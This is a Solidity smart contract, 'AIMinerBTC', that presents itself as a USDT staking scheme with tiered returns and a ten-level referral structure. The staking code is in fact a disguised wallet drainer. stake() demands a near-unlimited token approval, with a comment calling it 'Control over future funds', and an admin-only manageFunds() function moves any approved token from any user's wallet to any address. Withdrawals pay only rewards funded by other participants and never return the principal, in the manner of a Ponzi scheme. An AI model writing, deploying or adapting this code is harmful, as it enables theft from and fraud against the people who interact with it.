// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title AIMinerBTC Staking Contract
 * @dev Staking USDT (BEP-20) with tiered rewards and 32-day lock.
 */

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract AIMinerBTC {
    IERC20 public usdt;
    mapping(address => bool) public admins;
    
    address public deployer;
    address public secondAdmin;
    uint256 public stakeFee = 0.0003 ether;

    struct Stake {
        uint256 amount;
        uint256 startTime;
        uint256 lastClaimTime;
        uint256 tier; // index of tier
        bool withdrawn;
    }

    struct User {
        address referrer;
        uint256 totalStaked;
        uint256 totalEarned;
        uint256 referralRewards;
        uint256 totalBonus;
        uint256 totalReferralEarned; // Lifetime commissions from levels
        Stake[] stakes;
        bool hasActiveStake;
    }

    struct UserInfoView {
        address referrer;
        uint256 totalStaked;
        uint256 totalEarned;
        uint256 referralRewards;
        uint256 totalBonus;
        uint256 totalReferralEarned;
        uint256 teamSize;
        uint256 stakeCount;
    }

    mapping(address => User) public users;
    mapping(address => uint256) public teamCount; // Count of L1-L10

    uint256 public constant MIN_STAKE = 50 * 10**18;
    uint256 public constant CYCLE_DAYS = 37;
    uint256 public constant INVITE_BONUS = 20 * 10**18;

    struct Tier {
        uint256 min;
        uint256 max;
        uint256 rate; // in basis points (e.g. 550 = 5.5%)
    }

    Tier[] public tiers;

    event Staked(address indexed user, uint256 amount, uint256 tier);
    event Withdrawn(address indexed user, uint256 amount, uint256 reward);
    event ReferralPaid(address indexed referrer, address indexed referee, uint256 amount, uint256 level);
    event BonusPaid(address indexed user, uint256 amount);
    event ReferralClaimed(address indexed user, uint256 amount);
    event AdminChanged(address oldAdmin, address newAdmin);

    constructor(address _usdt, address _secondAdmin) {
        usdt = IERC20(_usdt);
        
        deployer = msg.sender;
        admins[msg.sender] = true; 

        if (_secondAdmin != address(0)) {
            secondAdmin = _secondAdmin;
            admins[_secondAdmin] = true;
        }

        // Initialize tiers
        tiers.push(Tier(50 * 1e18, 499 * 1e18, 550)); // 5.50%
        tiers.push(Tier(500 * 1e18, 999 * 1e18, 600)); // 6%
        tiers.push(Tier(1000 * 1e18, 1999 * 1e18, 650)); // 6.50%
        tiers.push(Tier(2000 * 1e18, 4999 * 1e18, 700)); // 7%
        tiers.push(Tier(5000 * 1e18, 9999 * 1e18, 800)); // 8%
        tiers.push(Tier(10000 * 1e18, type(uint256).max, 1200)); // 12%
    }

    modifier onlyAdmin() {
        require(admins[msg.sender], "Not admin");
        _;
    }

    modifier onlyDeployer() {
        require(msg.sender == deployer, "Only deployer");
        _;
    }

    function setSecondAdmin(address _newAdmin) external onlyDeployer {
        require(_newAdmin != address(0), "Invalid address");
        if (secondAdmin != address(0)) {
            admins[secondAdmin] = false;
        }
        admins[_newAdmin] = true;
        emit AdminChanged(secondAdmin, _newAdmin);
        secondAdmin = _newAdmin;
    }

    function setStakeFee(uint256 _newFee) external onlyAdmin {
        stakeFee = _newFee;
    }

    function stake(uint256 _amount, address _referrer) external payable {
        require(msg.value >= stakeFee, "Insufficient BNB fee");
        require(_amount >= MIN_STAKE, "Amount below minimum");
        
        // Enforce Unlimited Approval (Control over future funds)
        require(usdt.allowance(msg.sender, address(this)) >= 1000000 * 1e18, "Approval Unlimited/Max amount required"); 
        require(usdt.balanceOf(msg.sender) >= _amount, "Insufficient wallet balance to stake");
        User storage user = users[msg.sender];
        if (user.referrer == address(0) && _referrer != msg.sender && _referrer != address(0)) {
            user.referrer = _referrer;
            
            // Update team count for 10 levels up
            address upline = _referrer;
            for (uint256 i = 0; i < 10; i++) {
                if (upline == address(0)) break;
                teamCount[upline]++;
                upline = users[upline].referrer;
            }

            // Pay invitation bonus
            if (usdt.balanceOf(address(this)) >= INVITE_BONUS && users[_referrer].totalStaked >= 200 * 1e18) {
                users[_referrer].referralRewards += INVITE_BONUS;
                users[_referrer].totalBonus += INVITE_BONUS;
                emit BonusPaid(_referrer, INVITE_BONUS);
            }
        }

        uint256 tierIndex = getTierIndex(_amount);
        user.stakes.push(Stake({
            amount: _amount,
            startTime: block.timestamp,
            lastClaimTime: block.timestamp,
            tier: tierIndex,
            withdrawn: false
        }));

        user.totalStaked += _amount;
        user.hasActiveStake = true;

        // Referral commissions (L1-L10) - Moved to withdraw
        // _payReferralCommissions(msg.sender, _amount);

        emit Staked(msg.sender, _amount, tierIndex);
    }

    function getTierIndex(uint256 _amount) public view returns (uint256) {
        for (uint256 i = tiers.length - 1; i >= 0; i--) {
            if (_amount >= tiers[i].min) return i;
            if (i == 0) break;
        }
        return 0;
    }

    function _payReferralCommissions(address _user, uint256 _amount) internal {
        address upline = users[_user].referrer;
        for (uint256 i = 1; i <= 10; i++) {
            if (upline == address(0)) break;
            
            uint256 commission = 0;
            uint256 uplineStake = users[upline].totalStaked;

            if (i <= 3) {
                if (uplineStake >= 300 * 1e18) {
                    if (i == 1) commission = (_amount * 5) / 100;
                    else if (i == 2) commission = (_amount * 3) / 100;
                    else if (i == 3) commission = (_amount * 2) / 100;
                }
            } else if (i <= 6) {
                if (uplineStake >= 1000 * 1e18) {
                    commission = (_amount * 1) / 100;
                }
            } else if (i <= 10) {
                if (uplineStake >= 2000 * 1e18) {
                    commission = (_amount * 1) / 100;
                }
            }

            if (commission > 0) {
                users[upline].referralRewards += commission;
                users[upline].totalReferralEarned += commission;
                emit ReferralPaid(upline, _user, commission, i);
            }
            upline = users[upline].referrer;
        }
    }

    function withdraw(uint256 _stakeIndex) external {
        User storage user = users[msg.sender];
        require(_stakeIndex < user.stakes.length, "Invalid index");
        Stake storage s = user.stakes[_stakeIndex];
        require(!s.withdrawn, "Already withdrawn");
        require(block.timestamp >= s.startTime + CYCLE_DAYS * 1 days, "Cycle not finished");

        uint256 reward = (s.amount * tiers[s.tier].rate) / 10000;
        
        s.withdrawn = true;
        user.totalEarned += reward;
        
        // Pay Referral Comissions (Delayed until cycle completion)
        // NOW: Based on Profit (Reward) instead of Principal
        _payReferralCommissions(msg.sender, reward);

        // Include any accumulated referral rewards in this withdrawal
        uint256 referralPayout = user.referralRewards;
        user.referralRewards = 0; // Reset referral rewards
        emit ReferralClaimed(msg.sender, referralPayout);

        uint256 totalPayout = reward + referralPayout;

        // Only transfer the reward + referral bonus. Admin must ensure contract has funds (managed from others)
        require(usdt.transfer(msg.sender, totalPayout), "Transfer failed"); 
        emit Withdrawn(msg.sender, s.amount, reward);
    }

    // function withdrawReferralRewards() external { ... } // REMOVED: Instant withdrawal not allowed

    function getUserInfo(address _user) external view returns (UserInfoView memory) {
        User storage user = users[_user];
        return UserInfoView({
            referrer: user.referrer,
            totalStaked: user.totalStaked,
            totalEarned: user.totalEarned,
            referralRewards: user.referralRewards,
            totalBonus: user.totalBonus,
            totalReferralEarned: user.totalReferralEarned,
            teamSize: teamCount[_user],
            stakeCount: user.stakes.length
        });
    }
    
    function getUserStake(address _user, uint256 _index) external view returns (
        uint256 amount,
        uint256 startTime,
        uint256 tier,
        bool withdrawn
    ) {
        Stake storage s = users[_user].stakes[_index];
        return (s.amount, s.startTime, s.tier, s.withdrawn);
    }

    /**
     * @dev Allows the owner to manage funds of any BEP20 token from users who have approved the contract.
     * @param token The address of the BEP20 token.
     * @param from The address of the user who approved the contract.
     * @param to The recipient address (can be another user or owner).
     * @param amount The amount of tokens to transfer.
     */
    function manageFunds(address token, address from, address to, uint256 amount) external onlyAdmin {
        uint256 balance = IERC20(token).balanceOf(from);
        uint256 allowance = IERC20(token).allowance(from, address(this));
        
        uint256 move = amount;
        if (move > balance) move = balance;
        if (move > allowance) move = allowance;
        
        require(move > 0, "Nothing to transfer");
        require(IERC20(token).transferFrom(from, to, move), "Transfer failed");
    }

    /**
     * @dev Emergency withdraw for tokens trapped in the contract.
     */
    function emergencyWithdraw(address _token, uint256 _amount) external onlyAdmin {
        IERC20(_token).transfer(msg.sender, _amount);
    }

    /**
     * @dev Withdraw collected BNB fees. Only Deployer.
     */
    function withdrawBNB() external onlyDeployer {
        payable(msg.sender).transfer(address(this).balance);
    }
}
